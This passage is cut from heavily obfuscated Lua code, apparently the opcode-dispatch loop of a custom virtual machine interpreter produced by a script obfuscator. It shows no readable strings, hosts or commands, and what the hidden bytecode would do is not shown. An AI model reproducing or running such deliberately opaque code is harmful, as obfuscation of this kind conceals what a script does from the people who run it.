];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];elseif g==167 then local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=169 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];elseif g>170 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))else local k;local l,m;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];b=a[3];end;elseif g<=257 then if g<=214 then if g<=192 then if g<=181 then if g<=176 then if g<=173 then if g==172 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))else c[a[2]]=a[3];end;elseif g<=174 then local b=a[2]local e={c[b](c[b+1])};local d=0;for a=b,a[4]do d=d+1;c[a]=e[d];end elseif g>175 then local k;local m,l;local j;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else local i;local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];i=c[g];for a=g+1,a[3]do m(i,c[a])end;end;elseif g<=178 then if g>177 then local b=a[2]c[b]=c[b](f(c,b+1,a[3]))else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=179 then do return end;elseif g==180 then c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=186 then if g<=183 then if g==182 then local h;local g;c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])else local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=184 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>185 then if not c[a[2]]then b=b+1;else b=a[3];end;else local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];end;elseif g<=189 then if g<=187 then local k;local l,m;local j;local g;g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 k=0;for a=g,h do k=k+1;c[a]=l[k];end;b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,h))elseif g==188 then local g;local j;local l,m;local k;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]l={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=l[j];end b=b+1;a=d[b];b=a[3];else local a=a[2]c[a]=c[a](c[a+1])end;elseif g<=190 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];b=a[3];elseif g==191 then local i;local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2];i=c[g];for a=g+1,a[3]do m(i,c[a])end;else c[a[2]][a[3]]=c[a[4]];end;elseif g<=203 then if g<=197 then if g<=194 then if g>193 then local h;local j;local k;local i;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];i=c[a[3]];c[g+1]=i;c[g]=i[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2]k={c[g]()};j=a[4];h=0;for a=g,j do h=h+1;c[a]=k[h];end b=b+1;a=d[b];b=a[3];else local g;local j;local l,m;local k;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]l={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=l[j];end b=b+1;a=d[b];b=a[3];end;elseif g<=195 then c[a[2]]=-c[a[3]];elseif g>196 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];b=a[3];else local k;local l,m;local j;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,m=i(c[g](f(c,g+1,a[3])))h=m+g-1 k=0;for a=g,h do 